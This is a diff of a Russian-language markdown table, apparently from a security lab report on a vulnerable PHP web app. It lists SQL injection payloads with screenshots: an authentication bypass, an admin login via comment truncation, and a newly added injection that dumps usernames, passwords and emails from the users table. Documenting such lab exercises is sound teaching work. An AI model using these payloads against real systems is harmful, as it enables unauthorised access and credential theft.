@@ -193,5 +193,6 @@ $comments_result = $conn->query("SELECT * FROM comments");
 |----------|-----------|
 | Выполнить авторизацию без учетных данных ``` Логин: ' OR '1'='1 Пароль: ' OR '1'='1 ```| <img width="853" height="480" alt="image" src="https://github.com/user-attachments/assets/39c3b71c-c822-4ada-b73c-b68089e2597a" />|
 |Вход по учётной записью админа без пароля ``` Логин: admin'-- Пароль: 111 `` |<img width="590" height="309" alt="image" src="https://github.com/user-attachments/assets/dff791e2-c734-47cb-b201-3c28b298ef66" /> |
+|Вывести учетные данные пользователей при помощи запроса  ```'), ('dump', (SELECT GROUP_CONCAT(username, ':', password, ':', email SEPARATOR '; ') FROM users)) -- ```|<img width="867" height="347" alt="image" src="https://github.com/user-attachments/assets/2dfe929b-3df1-4a26-a4d4-f94718baf487" />|
  
 
